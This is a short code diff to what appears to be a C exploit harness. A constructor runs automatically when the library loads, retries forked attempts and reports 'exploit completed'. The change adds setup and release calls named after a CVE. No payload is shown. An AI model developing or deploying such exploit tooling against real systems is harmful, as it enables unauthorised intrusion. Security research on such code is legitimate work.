@@ -124,6 +124,10 @@ __attribute__((constructor)) static void load(void) {
   }
   started = 1;
   set_unbuffer();
+  if (!cve43499_managed_init()) {
+    pr_error("managed lifecycle initialization failed errno=%d\n", errno);
+    _exit(1);
+  }
   wait_for_boot_quiet_window();
 
   int max_attempts = env_int(
@@ -229,6 +233,7 @@ __attribute__((constructor)) static void load(void) {
                attempt, child, errno);
     }
     if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+      cve43499_managed_release();
       pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
       return;
     }
